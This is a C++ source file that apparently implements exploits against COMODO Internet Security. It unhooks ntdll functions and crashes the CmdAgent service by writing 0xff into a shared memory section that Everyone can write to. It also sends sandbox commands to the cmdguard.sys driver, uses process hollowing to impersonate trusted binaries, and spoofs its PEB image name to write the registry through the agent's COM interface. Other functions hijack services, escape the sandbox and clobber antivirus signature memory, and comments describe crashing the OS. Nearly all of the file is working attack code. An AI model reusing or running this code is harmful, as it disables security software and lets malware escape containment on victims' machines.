#include "stdafx.h"
#include "UserMethods.h"

UserMethods::UserMethods()
{
}


UserMethods::~UserMethods()
{
}

// Guard64.dll is injected into our process and usermode hooks many functions that may interfere with out escape
// This patches them so our higher level WINAPIs dont get hooked

void UserMethods::RepairNtDll() {

	BYTE rpcPrologue[] = { 0x40, 0x53, 0x56, 0x57, 0x48, 0x81, 0xEC, 0x80, 0x03, 0x00, 0x00 };
	BYTE prologue[] = { 0x4c, 0x8b, 0xd1, 0xb8 };
	BYTE filterConnectPrologue[] = { 0x40, 0x55, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41 };
	BYTE filterSendPrologue[] = { 0x48, 0x83, 0xec, 0x48, 0x48, 0x83, 0x64, 0x24, 0x38, 0x00 };
	DWORD oldProtect;
	BYTE* ndrpClientCall3 = (BYTE*)LoadLibrary(L"rpcrt4.dll") + 0xde340;
	HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
	HMODULE hFltLib = LoadLibrary(L"fltlib.dll");
	HMODULE hKernel32 = LoadLibrary(L"Kernel32.dll");

	static const BYTE syscall_NtConnectPort[] = { 0x9e,0x00 };

	static const BYTE syscall_NtCreateEvent[] = { 0x48, 0x00, 0x00, 0x00 };
	static const BYTE syscall_NtCreateThreadEx[] = { 0xbb, 0x00, 0x00, 0x00 };
	static const BYTE syscall_NtCreateSection[] = { 0x4A, 0x00, 0x00, 0x00 };
	static const BYTE createProcessInternalPrologue[] = { 0x4c, 0x8b, 0xdc, 0x53, 0x56 };
	static const BYTE syscall_NtOpenSection[] = { 0x37, 0x00, 0x00, 0x00 };
	static const BYTE syscall_NtRequestWaitReplyPort[] = { 0x22, 0x00, 0x00, 0x00 };
	static const BYTE syscall_ZwAlpcCreatePort[] = { 0x79, 0x00, 0x00, 0x00 };
	static const BYTE syscall_ZwAlpcConnectPortEx[] = { 0x78, 0x00, 0x00, 0x00 };
	static const BYTE syscall_ZwAlpcConnectPort[] = { 0x77, 0x00, 0x00, 0x00 };
	static const BYTE syscall_ZwAlpcSendWaitReceivePort[] = { 0x8a, 0x00, 0x00, 0x00 };
	static const BYTE syscall_ZwClose[] = { 0x0f, 0x00, 0x00, 0x00 };
	static const BYTE ldrLoadDllPrologue[] = { 0x40, 0x53, 0x56, 0x57, 0x41, 0x56 };

	BYTE* LdrLoadDll = (BYTE*)GetProcAddress(hNtdll, "LdrLoadDll");
	BYTE* CreateProcessInternal = (BYTE*)GetProcAddress(hKernel32, "CreateProcessInternalW");
	BYTE* NtConnectPort = (BYTE*)GetProcAddress(hNtdll, "NtConnectPort");
	BYTE* NtOpenSection = (BYTE*)GetProcAddress(hNtdll, "NtOpenSection");
	BYTE* NtRequestWaitReplyPort = (BYTE*)GetProcAddress(hNtdll, "NtRequestWaitReplyPort");
	BYTE* ZwAlpcConnectPortEx = (BYTE*)GetProcAddress(hNtdll, "ZwAlpcConnectPortEx");
	BYTE* ZwAlpcConnectPort = (BYTE*)GetProcAddress(hNtdll, "ZwAlpcConnectPort");
	BYTE* ZwAlpcSendWaitReceivePort = (BYTE*)GetProcAddress(hNtdll, "ZwAlpcSendWaitReceivePort");
	BYTE* ZwAlpcCreatePort = (BYTE*)GetProcAddress(hNtdll, "ZwAlpcCreatePort");
	BYTE* ZwClose = (BYTE*)GetProcAddress(hNtdll, "ZwClose");
	BYTE* NtCreateEvent = (BYTE*)GetProcAddress(hNtdll, "NtCreateEvent");
	BYTE* NtCreateThreadEx = (BYTE*)GetProcAddress(hNtdll, "NtCreateThreadEx");
	BYTE* NtCreateSection = (BYTE*)GetProcAddress(hNtdll, "NtCreateSection");
	BYTE* filterSendMessage = (BYTE*)GetProcAddress(hFltLib, "FilterSendMessage");
	BYTE* FilterConnectCommunicationPort = (BYTE*)GetProcAddress(hFltLib, "FilterConnectCommunicationPort");


	VirtualProtect(LdrLoadDll, 0x10, PAGE_EXECUTE_READWRITE, &oldProtect);
	VirtualProtect(CreateProcessInternal, 0x10, PAGE_EXECUTE_READWRITE, &oldProtect);
	VirtualProtect(NtConnectPort, 0x10, PAGE_EXECUTE_READWRITE, &oldProtect);
	VirtualProtect(NtOpenSection, 0x10, PAGE_EXECUTE_READWRITE, &oldProtect);
	VirtualProtect(NtRequestWaitReplyPort, 0x10, PAGE_EXECUTE_READWRITE, &oldProtect);
	VirtualProtect(ZwAlpcConnectPortEx, 0x10, PAGE_EXECUTE_READWRITE, &oldProtect);
	VirtualProtect(ZwAlpcConnectPort, 0x10, PAGE_EXECUTE_READWRITE, &oldProtect);
	VirtualProtect(ZwAlpcSendWaitReceivePort, 0x10, PAGE_EXECUTE_READWRITE, &oldProtect);
	VirtualProtect(ZwClose, 0x10, PAGE_EXECUTE_READWRITE, &oldProtect);

	VirtualProtect(NtCreateEvent, 0x10, PAGE_EXECUTE_READWRITE, &oldProtect);
	VirtualProtect(NtCreateThreadEx, 0x10, PAGE_EXECUTE_READWRITE, &oldProtect);
	VirtualProtect(NtCreateSection, 0x10, PAGE_EXECUTE_READWRITE, &oldProtect);
	VirtualProtect(NtCreateSection, 0x10, PAGE_EXECUTE_READWRITE, &oldProtect);
	VirtualProtect(ndrpClientCall3, 0x10, PAGE_EXECUTE_READWRITE, &oldProtect);
	VirtualProtect(filterSendMessage, 0x10, PAGE_EXECUTE_READWRITE, &oldProtect);
	VirtualProtect(FilterConnectCommunicationPort, 0x10, PAGE_EXECUTE_READWRITE, &oldProtect);

	memcpy(LdrLoadDll, ldrLoadDllPrologue, sizeof(ldrLoadDllPrologue));

	memcpy(CreateProcessInternal, createProcessInternalPrologue, sizeof(createProcessInternalPrologue));

	memcpy(filterSendMessage, filterSendPrologue, sizeof(filterSendPrologue));

	memcpy(FilterConnectCommunicationPort, filterConnectPrologue, sizeof(filterConnectPrologue));

	memcpy(NtConnectPort, prologue, sizeof(prologue));
	memcpy(NtConnectPort + sizeof(prologue), syscall_NtConnectPort, sizeof(syscall_NtConnectPort));

	memcpy(NtOpenSection, prologue, sizeof(prologue));
	memcpy(NtOpenSection + sizeof(prologue), syscall_NtOpenSection, sizeof(syscall_NtOpenSection));

	memcpy(NtRequestWaitReplyPort, prologue, sizeof(prologue));
	memcpy(NtRequestWaitReplyPort + sizeof(prologue), syscall_NtRequestWaitReplyPort, sizeof(syscall_NtRequestWaitReplyPort));

	memcpy(ZwAlpcConnectPortEx, prologue, sizeof(prologue));
	memcpy(ZwAlpcConnectPortEx + sizeof(prologue), syscall_ZwAlpcConnectPortEx, sizeof(syscall_ZwAlpcConnectPortEx));

	memcpy(ZwAlpcConnectPort, prologue, sizeof(prologue));
	memcpy(ZwAlpcConnectPort + sizeof(prologue), syscall_ZwAlpcConnectPort, sizeof(syscall_ZwAlpcConnectPort));

	memcpy(ZwAlpcSendWaitReceivePort, prologue, sizeof(prologue));
	memcpy(ZwAlpcSendWaitReceivePort + sizeof(prologue), syscall_ZwAlpcSendWaitReceivePort, sizeof(syscall_ZwAlpcSendWaitReceivePort));

	memcpy(ZwAlpcCreatePort, prologue, sizeof(prologue));
	memcpy(ZwAlpcCreatePort + sizeof(prologue), syscall_ZwAlpcCreatePort, sizeof(syscall_ZwAlpcCreatePort));

	memcpy(NtCreateEvent, prologue, sizeof(prologue));
	memcpy(NtCreateEvent + sizeof(prologue), syscall_NtCreateEvent, sizeof(syscall_NtCreateEvent));

	memcpy(NtCreateThreadEx, prologue, sizeof(prologue));
	memcpy(NtCreateThreadEx + sizeof(prologue), syscall_NtCreateThreadEx, sizeof(syscall_NtCreateThreadEx));

	memcpy(NtCreateSection, prologue, sizeof(prologue));
	memcpy(NtCreateSection + sizeof(prologue), syscall_NtCreateSection, sizeof(syscall_NtCreateSection));

	memcpy(ZwClose, prologue, sizeof(prologue));
	memcpy(ZwClose + sizeof(prologue), syscall_ZwClose, sizeof(syscall_ZwClose));

	memcpy(ndrpClientCall3, rpcPrologue, sizeof(rpcPrologue));
}

// Changes the process name in our PEB->Ldr->InMemoryOrderModuleList
// which is checked by CmdAgent.exe when trying to obtain interface to IServiceProvider
// This is only required if we didnt hollow ourselves into a trusted application

void UserMethods::ChangePEBImageName(std::wstring str) {
	PROCESS_BASIC_INFORMATION pi;
	NtQueryInformationProcess _NtQueryInformationProcess = (NtQueryInformationProcess)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtQueryInformationProcess");
	DWORD dwReturnLength = 0;
	_NtQueryInformationProcess(INVALID_HANDLE_VALUE, 0, &pi, sizeof(PROCESS_BASIC_INFORMATION), &dwReturnLength);
	PPEB peb = (PPEB)pi.PebBaseAddress;
	LIST_ENTRY* mainModule = peb->Ldr->InMemoryOrderModuleList.Flink;
	PLDR_DATA_TABLE_ENTRY pLDTE = CONTAINING_RECORD(mainModule, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
	lstrcpyW(pLDTE->FullDllName.Buffer, str.c_str());
	pLDTE->FullDllName.Length = str.length() * sizeof(wchar_t);
}

void UserMethods::RtlInitUnicodeString(PUNICODE_STRING u, wchar_t* string) {
	int len = lstrlenW(string);
	u->Buffer = (PWSTR)HeapAlloc(GetProcessHeap(), MEM_COMMIT | MEM_RESERVE, (len * 2) + 2);
	u->Length = len * 2;
	u->MaximumLength = (len * 2) + 2;
	lstrcpynW(u->Buffer, string, len + 2);
}

// CmdAgent.exe exposes a Section Object that is writable by "Everyone". 
// Writting a series of 0xff's is enough to crash it immediately as this buffer contains
// sizes that will cause loops to access invalid memory

void UserMethods::CrashCmdAgent() {
	RepairNtDll();
	HANDLE hMap = OpenFileMapping(FILE_MAP_WRITE, false, L"Global\\{2DD3D2AA-C441-4953-ADA1-5B72F58233C4}_CisSharedMemBuff");
	BYTE* buff = (BYTE*)MapViewOfFile(hMap, FILE_MAP_WRITE, 0, 0, 0x100);
	for (int i = 0; i < 0x100; i++)
		buff[i] = 0xff;
}

// Given a PID, sandboxes the process by sending sandbox cmd to cmdguard.sys. This can even sandbox
// the "System" process. Effects are interesting, and if done to all processes,
// breaks the OS and requires a restart

void UserMethods::SandboxProcess(DWORD PID) {
	RepairNtDll();
	CmdGuardInterface ci(L"\\cmdAuthPort");
	messageBlock msg;
	msg.ioctl = 0x10000000;
	msg.unkwn2 = 8;
	msg.unkwn3 = 2;
	msg.unkwn4 = 0x1a;
	msg.pid = PID;
	msg.unkwn6 = 6;
	ci.SendAuthMessage(&msg);
}

// This connects to cmdvirth.exe LPC port "cmdvrtLPCServerPort". 
// Ideally we could communicate over it, however there seems to be hardcoded NULLs for 
// a memcpy operation (LPC_DATAGRAM processing) and crashes before we can actually talk properly to it.

void UserMethods::CrashCmdVirth() {

	HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
	HANDLE hMap = CreateFileMapping(INVALID_HANDLE_VALUE, 0, PAGE_EXECUTE_READWRITE, 0, 0x474, NULL);
	HANDLE pHandle = NULL;
	TNtConnectPort NtConnectPort = (TNtConnectPort)GetProcAddress(hNtdll, "NtConnectPort");
	TNtRequestPort NtRequestPort = (TNtRequestPort)GetProcAddress(hNtdll, "NtRequestPort");
	UNICODE_STRING port_name = {};
	REMOTE_PORT_VIEW rpv = {};
	LARGE_INTEGER SecSize;
	LPC_MESSAGE lmsg = {};
	BYTE data[] = { 0x68, 0x04, 0xff, 0xff, 0xff };
	OBJECT_ATTRIBUTES oa = {};
	PORT_VIEW pv;
	ULONG max_msg_len = 0x18;
	SECURITY_QUALITY_OF_SERVICE qos = {};

	RtlInitUnicodeString(&port_name, L"\\RPC Control\\cmdvrtLPCServerPort");
	lmsg.MessageSize = sizeof(data);
	memcpy(lmsg.Data, data, sizeof(data));
	lmsg.MessageSize = FIELD_OFFSET(LPC_MESSAGE, Data) + lmsg.DataSize;
	byte ConnectDataBuffer[0x4c];
	SecSize.LowPart = 0x4c;
	SecSize.HighPart = 0x0;
	rpv.Length = 0x18;

	qos.Length = 0xc;
	qos.ImpersonationLevel = SecurityImpersonation;
	*(WORD*)&qos.ContextTrackingMode = 0x101;

	pv.Length = 0x30;
	pv.SectionHandle = hMap;
	pv.SectionOffset = 0;
	pv.ViewBase = 0;
	pv.ViewRemoteBase = 0;
	pv.ViewSize = 0x474;

	// We initialize our shared memory with values that "ideally" would take LPC_DATAGRAM to interesting parts...instead it crashes
	NtConnectPort(&pHandle, &port_name, &qos, &pv, &rpv, 0, ConnectDataBuffer, &SecSize.LowPart);
	((DWORD*)pv.ViewBase)[0] = 0x468;
	((DWORD*)pv.ViewBase)[2] = 0;
	((DWORD*)pv.ViewBase)[3] = 2;
	((DWORD*)pv.ViewBase)[4] = 1;
	((DWORD*)pv.ViewBase)[5] = 0;
	NtRequestPort(pHandle, &lmsg);
}

// CmdGuiPort is a filter driver port exposed by cmdguard.sys. It is only intended to be connected by trusted ComodoApp and there is
// Max connection of 1. Meaning we will need to crash cmdagent.exe first and connect before service spawns back and connects.

void UserMethods::CrashCmdGuiPort() {
	wchar_t targetProcPath[MAX_PATH] = L"C:\\Program Files\\COMODO\\COMODO Internet Security\\cmdvirth.exe";
	Hollower hollow(targetProcPath);
	hollow.Start(L"crashGuiPort");
}

// "\cmdServicePort" is a filter driver port exposed by cmdguard.sys. It is intended to only be accessed by 
// %COMODOPATH%\cmdVirth.exe. This requires a hollow to impersonate process to aquire a handle.
// ... oh yeah.. this BSODs to OS (due to the message we later send to it).

void UserMethods::CrashServicePort() {
	wchar_t targetProcPath[MAX_PATH] = L"C:\\Program Files\\COMODO\\COMODO Internet Security\\cmdvirth.exe";
	Hollower hollow(targetProcPath);
	hollow.Start(L"crashServicePort");
}

void UserMethods::ReplaceCmdAgentService(std::wstring imagePath) {

	wchar_t targetProcPath[MAX_PATH] = L"C:\\Program Files\\COMODO\\COMODO Internet Security\\cmdvirth.exe";

	Hollower hollow(targetProcPath);
	std::wstring hijackArgs(L"hijackService " + imagePath);
	hollow.Start(hijackArgs.c_str());
}

// Write REG_SZ key leveraging cmdAgent service
// seperate regPath and actual regKey
// ie: 
//    -regPath = "\Software\Google"
//    -regKey = "Chrome"
//    -regValue "(default)"
//	  -data = "blah"

void UserMethods::RegSZWrite(HKEY hive, std::wstring regPath, std::wstring regKey, std::wstring regValue, std::wstring data) {

	OleInitialize(NULL);

	SetCurrentDirectory(L"C:\\Program Files\\COMODO\\COMODO Internet Security");
	BSTR bRegPath = SysAllocString(regPath.c_str());
	BSTR bRegKey = SysAllocString(regKey.c_str());
	BSTR bRegValue = SysAllocString(regValue.c_str());
	BSTR bRegData = SysAllocString(data.c_str());
	ISvcRegistryAccess* svcRegAccess;

	SvcRegKey* regInterface = NULL, *regWritter = NULL;
	IServiceProv* srvProv = NULL;
	IID IID_ICisGate, IID_ICisClassFactory, IID_ICisFacade, IID_ISvcRegistryAccess;
	BYTE* COMCallbacks = (BYTE*)LoadLibrary(L"cavshell.dll") + 0x3fd88;

	// Set trusted signed binary to pass EnunModules check done by CmdAgent
	ChangePEBImageName(L"C:\\Program Files\\COMODO\\COMODO Internet Security\\CisTray.exe");
	wchar_t ICisGate_string[40], ICisClassFactory_string[40], ICisFacade_string[40], ISvcRegistryAccess_string[40];

	//filePath = (wchar_t**)HeapAlloc(GetProcessHeap(), MEM_COMMIT, 0x1000*sizeof(wchar_t));
	CisGate* classFactory = NULL;
	CisClassFactory* cisClassFactory = NULL, *out = NULL;
	IID empty = {};

	wcscpy(ICisGate_string, L"{C288AC5A-D846-4696-8028-2DF6F508D0D9}");
	wcscpy(ICisClassFactory_string, L"{1220A5C3-9B6C-4A8A-ABE4-7CE6118384A9}");
	wcscpy(ICisFacade_string, L"{A8F46273-16B9-4009-AF0F-2EFA988DD75D}");
	wcscpy(ISvcRegistryAccess_string, L"{22DCF474-C7B3-4BF2-8002-47A03010E96A}");

	IIDFromString(ISvcRegistryAccess_string, &IID_ISvcRegistryAccess);
	IIDFromString(ICisGate_string, &IID_ICisGate);
	IIDFromString(ICisClassFactory_string, &IID_ICisClassFactory);
	IIDFromString(ICisFacade_string, &IID_ICisFacade);

	CoGetClassObject(IID_ICisGate, CLSCTX_LOCAL_SERVER, 0, IID_IClassFactory, (void**)&classFactory);
	classFactory->QueryInterface(IID_ICisClassFactory, (void**)&cisClassFactory);

	cisClassFactory->CreateInstance(&COMCallbacks, 0, IID_IServiceProvider, (void**)&srvProv);
	srvProv->GetIReg(empty, IID_ISvcRegistryAccess, (void**)&svcRegAccess);

	svcRegAccess->GetRegInterface(hive, bRegPath, (void**)&regInterface);
	regInterface->OpenWriteKey(bRegKey, 0, (void**)&regWritter);
	regWritter->SetRegSz(bRegValue, bRegData);

	// cleanup
	regWritter->Release();
	regInterface->Release();
	svcRegAccess->Release();
	cisClassFactory->Release();
}

// All this is is a crash of CmdAgent followed by child process creation
// which fails to be sandboxed
void UserMethods::SandboxEscape() {
	wchar_t procPath[MAX_PATH];
	GetModuleFileName(NULL, procPath, MAX_PATH);
	STARTUPINFO si = {};
	si.cb = sizeof(STARTUPINFO);
	PROCESS_INFORMATION pi = {};
	CrashCmdAgent();
	CreateProcess(procPath, NULL, 0, 0, false, 0, NULL, NULL, &si, &pi);
}

void UserMethods::ClobberCavSignature(std::wstring wstr, bool flagAll) {
	std::wstring fullSectionObj(L"Global\\" + wstr);
	RepairNtDll();
	HANDLE hMap = OpenFileMapping(FILE_MAP_WRITE, false, fullSectionObj.c_str());
	BYTE* buff = (BYTE*)MapViewOfFile(hMap, FILE_MAP_WRITE, 0, 0, 0x1000);
	for (int i = 0; i < 0x1000; i++)
		buff[i] = (!flagAll) * 0xff;
}
